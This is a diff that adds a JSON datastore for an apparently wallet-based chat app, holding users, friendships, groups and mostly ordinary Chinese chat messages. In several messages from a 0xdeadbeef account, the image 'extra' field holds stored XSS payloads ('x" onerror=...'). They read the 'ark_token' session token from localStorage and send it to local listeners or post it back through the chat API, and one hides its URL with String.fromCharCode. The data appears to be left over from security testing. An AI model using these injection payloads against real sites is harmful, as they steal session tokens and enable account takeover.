@@ -1,0 +1,381 @@
+{
+ "users": {
+  "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e": {
+   "addr": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+   "name": "@Adrain",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792632098023,
+   "created": 1791923816264,
+   "handle": "Adrain",
+   "uid": "472101"
+  },
+  "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7": {
+   "addr": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+   "handle": "ARK",
+   "uid": "582327",
+   "name": "@ARK",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792857013225,
+   "created": 1791927138995
+  },
+  "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": {
+   "addr": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+   "handle": "",
+   "uid": "602857",
+   "name": "0xa52e…9366",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792423119821,
+   "created": 1791953141565
+  },
+  "0x9c2f473806faff4db2ee5d8eee18f2c463fb3de9": {
+   "addr": "0x9c2f473806faff4db2ee5d8eee18f2c463fb3de9",
+   "handle": "",
+   "uid": "869507",
+   "name": "0x9c2f…3de9",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1791970817090,
+   "created": 1791970805427
+  },
+  "0x100844ccd4af887d123c0ac4a9671e0ab5dd9de2": {
+   "addr": "0x100844ccd4af887d123c0ac4a9671e0ab5dd9de2",
+   "handle": "",
+   "uid": "546311",
+   "name": "0x1008…9de2",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792390202737,
+   "created": 1792390183434
+  },
+  "0x1111111111111111111111111111111111111111": {
+   "addr": "0x1111111111111111111111111111111111111111",
+   "handle": "",
+   "uid": "291981",
+   "name": "0x1111…1111",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792630537949,
+   "created": 1792630537949
+  },
+  "0xaaaa000000000000000000000000000000000001": {
+   "addr": "0xaaaa000000000000000000000000000000000001",
+   "handle": "",
+   "uid": "142300",
+   "name": "0xaaaa…0001",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792630774842,
+   "created": 1792630774842
+  },
+  "0xbbbb000000000000000000000000000000000002": {
+   "addr": "0xbbbb000000000000000000000000000000000002",
+   "handle": "",
+   "uid": "431885",
+   "name": "0xbbbb…0002",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792630774964,
+   "created": 1792630774964
+  },
+  "0xcccc000000000000000000000000000000000003": {
+   "addr": "0xcccc000000000000000000000000000000000003",
+   "handle": "",
+   "uid": "346134",
+   "name": "0xcccc…0003",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792630775113,
+   "created": 1792630775113
+  },
+  "0x0000000000000000000000000000000000000000": {
+   "addr": "0x0000000000000000000000000000000000000000",
+   "handle": "",
+   "uid": "596680",
+   "name": "0x0000…0000",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792631551622,
+   "created": 1792631546968
+  },
+  "0xdeadbeef0000000000000000000000000000cafe": {
+   "addr": "0xdeadbeef0000000000000000000000000000cafe",
+   "handle": "",
+   "uid": "152396",
+   "name": "0xdead…cafe",
+   "avatar": "",
+   "online": false,
+   "lastSeen": 1792637159936,
+   "created": 1792637076135
+  }
+ },
+ "friends": {
+  "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7": [
+   "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+   "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366"
+  ],
+  "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e": [
+   "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7"
+  ],
+  "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": [
+   "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7"
+  ]
+ },
+ "requests": {
+  "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7": {},
+  "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": {}
+ },
+ "groups": {
+  "g_23d21a127ebf": {
+   "gid": "g_23d21a127ebf",
+   "name": "testgrp",
+   "owner": "0xdeadbeef0000000000000000000000000000cafe",
+   "members": [
+    "0xdeadbeef0000000000000000000000000000cafe"
+   ],
+   "created": 1792637021277
+  },
+  "g_8e00afb0b1fc": {
+   "gid": "g_8e00afb0b1fc",
+   "name": "grp2",
+   "owner": "0xdeadbeef0000000000000000000000000000cafe",
+   "members": [
+    "0xdeadbeef0000000000000000000000000000cafe",
+    "0x1111222233334444555566667777888899990000"
+   ],
+   "created": 1792637099435
+  }
+ },
+ "messages": {
+  "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7_0xb5e113dd2fcb87a458191c3b0e2d606129455d4e": [
+   {
+    "id": "d652577aaf99fcd3",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "text": "你好",
+    "type": "text",
+    "extra": null,
+    "ts": 1791927585041
+   },
+   {
+    "id": "e64700c0f20a6713",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "text": "你好",
+    "type": "text",
+    "extra": null,
+    "ts": 1791927610816
+   },
+   {
+    "id": "7c97962fb6144cc0",
+    "from": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "to": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "text": "你好",
+    "type": "text",
+    "extra": null,
+    "ts": 1791927864006
+   },
+   {
+    "id": "9c4bc964465175d8",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "text": "[图片]",
+    "type": "image",
+    "extra": "/posters/d0c494f8bec46e27.jpg",
+    "ts": 1791928007918
+   },
+   {
+    "id": "c67b600880b46bff",
+    "from": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "to": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "text": "[图片]",
+    "type": "image",
+    "extra": "/posters/5cea322368d46f5b.jpg",
+    "ts": 1791928404530
+   },
+   {
+    "id": "9385abf3e0bd0cc5",
+    "from": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "to": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "text": "你好啊",
+    "type": "text",
+    "extra": null,
+    "ts": 1791948280235
+   },
+   {
+    "id": "ae075eb0cd603458",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e",
+    "text": "你好",
+    "type": "text",
+    "extra": null,
+    "ts": 1792253325058
+   }
+  ],
+  "0xtest1_0xtest2": [
+   {
+    "id": "cf1fe9305dcbd9e3",
+    "from": "0xtest1",
+    "to": "0xtest2",
+    "text": "[图片]",
+    "type": "image",
+    "extra": "/posters/cb909844632960b7.png",
+    "ts": 1791928174150
+   }
+  ],
+  "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7_0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": [
+   {
+    "id": "fe4990ea9993face",
+    "from": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "to": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "text": "你好",
+    "type": "text",
+    "extra": null,
+    "ts": 1791953391230
+   },
+   {
+    "id": "8d0a0fe368dde168",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "text": "[已撤回]",
+    "type": "image",
+    "extra": "/posters/8de4025dda4eb966.jpg",
+    "ts": 1791953418185,
+    "recalled": true
+   },
+   {
+    "id": "bae552cd87c8859a",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "text": "[图片]",
+    "type": "image",
+    "extra": "/posters/a61edb03074d57e2.jpg",
+    "ts": 1791953423672
+   },
+   {
+    "id": "adbba5d5714258f2",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "text": "推广是要再系统上发推广码给其他的人才有收益",
+    "type": "text",
+    "extra": null,
+    "ts": 1791955678243
+   },
+   {
+    "id": "5e61a86f2f8d36af",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "text": "推广是要在系统上发你的推广码给其他的人才有收益",
+    "type": "text",
+    "extra": null,
+    "ts": 1791955730626
+   },
+   {
+    "id": "246cf95b558aa2a4",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "text": "在干嘛",
+    "type": "text",
+    "extra": null,
+    "ts": 1792233866421
+   },
+   {
+    "id": "0d35ff30f91cb772",
+    "from": "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7",
+    "to": "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366",
+    "text": "能收到信息吗",
+    "type": "text",
+    "extra": null,
+    "ts": 1792507489399
+   }
+  ],
+  "0xdeadbeef0000000000000000000000000000cafe_0xdeadbeef0000000000000000000000000000cafe": [
+   {
+    "id": "f12101a7f373d3dd",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "to": "0xdeadbeef0000000000000000000000000000cafe",
+    "text": "hi",
+    "type": "image",
+    "extra": "x\" onerror=\"fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,120))",
+    "ts": 1792637007965
+   },
+   {
+    "id": "086ec7f33a3baca3",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "to": "0xdeadbeef0000000000000000000000000000cafe",
+    "text": "STOLEN_TOKEN=VICTIM_SESSION_TOKEN_9f3a2b",
+    "type": "text",
+    "extra": null,
+    "ts": 1792637155971
+   }
+  ],
+  "g_23d21a127ebf": [
+   {
+    "id": "2ce4fb51b8228f92",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "gid": "g_23d21a127ebf",
+    "text": "hi",
+    "type": "image",
+    "extra": "x\" onerror=\"window.__pwned=document.domain+'|'+localStorage.getItem('ark_token')\"",
+    "ts": 1792637024966
+   },
+   {
+    "id": "f51f7c74f1302744",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "gid": "g_23d21a127ebf",
+    "text": "hi",
+    "type": "image",
+    "extra": "x\" onerror=\"(new Image).src='http://127.0.0.1:8931/leak?t='+encodeURIComponent(localStorage.getItem('ark_token'))",
+    "ts": 1792637108039
+   },
+   {
+    "id": "ff25c268ea3189fd",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "gid": "g_23d21a127ebf",
+    "text": "hi",
+    "type": "image",
+    "extra": "x\" onerror=\"(new Image).src='http://127.0.0.1:8932/leak?t='+encodeURIComponent(localStorage.getItem('ark_token'))",
+    "ts": 1792637137614
+   },
+   {
+    "id": "d20d2db0bb4e52b9",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "gid": "g_23d21a127ebf",
+    "text": "hi",
+    "type": "image",
+    "extra": "x\" onerror=\"fetch('/api/chat/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({from:'0xdeadbeef0000000000000000000000000000cafe',to:'0xdeadbeef0000000000000000000000000000cafe',text:'STOLEN_TOKEN='+localStorage.getItem('ark_token')})})",
+    "ts": 1792637150169
+   }
+  ],
+  "g_8e00afb0b1fc": [],
+  "0x1111222233334444555566667777888899990000_0xdeadbeef0000000000000000000000000000cafe": [
+   {
+    "id": "feab59b99909d35c",
+    "from": "0xdeadbeef0000000000000000000000000000cafe",
+    "to": "0x1111222233334444555566667777888899990000",
+    "text": "hello victim",
+    "type": "image",
+    "extra": "x\" onerror=\"window.__p=1\"",
+    "ts": 1792637099550
+   }
+  ]
+ },
+ "posts": {},
+ "unread": {
+  "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7": {
+   "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7_0xb5e113dd2fcb87a458191c3b0e2d606129455d4e": 0,
+   "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7_0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": 0
+  },
+  "0xb5e113dd2fcb87a458191c3b0e2d606129455d4e": {
+   "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7_0xb5e113dd2fcb87a458191c3b0e2d606129455d4e": 0
+  },
+  "0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": {
+   "0x2c8f48175344100e8dc2f8c2390f376a19dc68f7_0xa52eb09f7df2f8284fad8af9443a947aaf6b9366": 0
+  },
+  "0xdeadbeef0000000000000000000000000000cafe": {
+   "g_23d21a127ebf": 0
+  }
+ }
+}
